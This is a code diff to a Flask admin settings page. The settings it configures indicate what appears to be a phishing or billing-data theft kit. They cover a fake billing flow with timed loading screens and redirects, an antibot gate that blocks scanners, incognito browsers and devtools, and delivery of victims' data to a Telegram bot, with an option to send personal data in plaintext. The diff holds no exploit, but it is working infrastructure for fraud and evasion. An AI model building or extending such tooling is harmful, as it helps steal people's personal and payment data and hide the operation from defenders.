@@ -1489,6 +1489,7 @@ def create_app() -> Flask:
         bool_keys = {
             "COOKIE_SECURE",
             "STRICT_ORIGIN",
+            "GUARD_DEVTOOLS",
             "GATE_CSRF_DISABLED",
             "HANDSHAKE_DISABLED",
             "API_CSRF_DISABLED",
@@ -1543,6 +1544,106 @@ def create_app() -> Flask:
                     error = str(exc)
 
         grouped = admin_env.values_by_group(current_values)
+        hidden_keys = {
+            # Runtime-generated or internal secrets; not useful in daily admin edits.
+            "FLASK_SECRET_KEY",
+            "HANDOFF_SECRET",
+            "GATE_HMAC_SECRET",
+        }
+        label_map = {
+            "SESSION_SAMESITE": "Session SameSite policy",
+            "COOKIE_SECURE": "Secure cookies (HTTPS only)",
+            "STRICT_ORIGIN": "Strict Origin/Referer checks",
+            "POW_LEADING_ZEROS_HEX": "PoW difficulty (leading zeros)",
+            "GUARD_DEVTOOLS": "Devtools shell guard",
+            "GATE_CSRF_DISABLED": "Disable gate CSRF",
+            "HANDSHAKE_DISABLED": "Disable gate handshake",
+            "API_CSRF_DISABLED": "Disable API CSRF",
+            "START_DEBUG_SECRET": "Start debug secret token",
+            "GATE_BLOCKED_REDIRECT_URL": "Blocked redirect URL",
+            "INCOGNITO_BLOCK": "Block incognito/private mode",
+            "RISK_BLOCK_THRESHOLD": "Risk block threshold",
+            "REMOTE_ANTIBOT": "Remote antibot enabled",
+            "REMOTE_ANTIBOT_URL": "Remote antibot endpoint",
+            "REMOTE_ANTIBOT_API_KEY": "Remote antibot API key",
+            "REMOTE_ANTIBOT_TIMEOUT_SEC": "Remote antibot timeout (sec)",
+            "REMOTE_ANTIBOT_FAIL_OPEN": "Fail open on antibot error",
+            "BILLING_REG_LOADING_SECONDS": "Loading duration after submit (sec)",
+            "BILLING_POST_REG_GLASS_SECONDS": "Extra pre-done glass duration (sec)",
+            "BILLING_DONE_REDIRECT_URL": "Done redirect URL",
+            "BILLING_DONE_REDIRECT_DELAY_SEC": "Done redirect delay (sec)",
+            "TELEGRAM_BOT_TOKEN": "Telegram bot token",
+            "TELEGRAM_CHAT_ID": "Telegram chat id",
+            "TELEGRAM_THREAD_ID": "Telegram thread id (optional)",
+            "TELEGRAM_PII_PLAINTEXT": "Send plaintext PII to Telegram",
+            "ADMIN_PANEL_PASSWORD": "Admin panel password",
+            "ADMIN_PANEL_ACCESS_MODE": "Admin access mode",
+            "ADMIN_PANEL_IP_WHITELIST": "Admin allowed IP list",
+            "ACTIVE_THEME": "Active theme",
+        }
+        numeric_keys = {
+            "POW_LEADING_ZEROS_HEX",
+            "RISK_BLOCK_THRESHOLD",
+            "REMOTE_ANTIBOT_TIMEOUT_SEC",
+            "BILLING_REG_LOADING_SECONDS",
+            "BILLING_POST_REG_GLASS_SECONDS",
+            "BILLING_DONE_REDIRECT_DELAY_SEC",
+        }
+        url_keys = {
+            "REMOTE_ANTIBOT_URL",
+            "GATE_BLOCKED_REDIRECT_URL",
+            "BILLING_DONE_REDIRECT_URL",
+        }
+        textarea_keys = {
+            "ADMIN_PANEL_IP_WHITELIST",
+        }
+        select_options: dict[str, list[tuple[str, str]]] = {
+            "SESSION_SAMESITE": [
+                ("", "Default"),
+                ("Lax", "Lax"),
+                ("Strict", "Strict"),
+                ("None", "None"),
+            ],
+            "ADMIN_PANEL_ACCESS_MODE": [
+                ("open", "open"),
+                ("restricted", "restricted"),
+            ],
+        }
+        group_title_map = {
+            "security": "Security",
+            "gate": "Gate & antibot",
+            "flow": "Flow timing",
+            "telegram": "Telegram",
+            "admin": "Admin controls",
+        }
+        group_desc_map = {
+            "security": "Cookie/session protection and request-origin checks.",
+            "gate": "Gate hardening and remote antibot controls.",
+            "flow": "Loading/success timing and redirect behavior.",
+            "telegram": "Telegram delivery destination and privacy mode.",
+            "admin": "Panel login and access restrictions.",
+        }
+        for _g_name, _entries in grouped.items():
+            for _k, _meta in _entries.items():
+                _meta["hidden"] = _k in hidden_keys
+                _meta["label"] = label_map.get(_k, _k.replace("_", " ").title())
+                if _k in select_options:
+                    _meta["widget"] = "select"
+                    _meta["options"] = select_options[_k]
+                elif _k in textarea_keys:
+                    _meta["widget"] = "textarea"
+                    _meta["rows"] = 3
+                elif _k in numeric_keys:
+                    _meta["widget"] = "number"
+                elif _k in bool_keys:
+                    _meta["widget"] = "bool"
+                elif _k in url_keys:
+                    _meta["widget"] = "url"
+                else:
+                    _meta["widget"] = "password" if _meta.get("sensitive") else "text"
+            grouped[_g_name] = {
+                _k: _v for _k, _v in _entries.items() if not _v.get("hidden")
+            }
         active_theme = _admin_theme_id_live()
         return render_template(
             "admin_settings.html",
@@ -1554,6 +1655,8 @@ def create_app() -> Flask:
             bool_keys=bool_keys,
             saved_keys=saved_keys,
             access_mode=_admin_access_mode_live(),
+            group_title_map=group_title_map,
+            group_desc_map=group_desc_map,
         )
 
     @app.get("/")
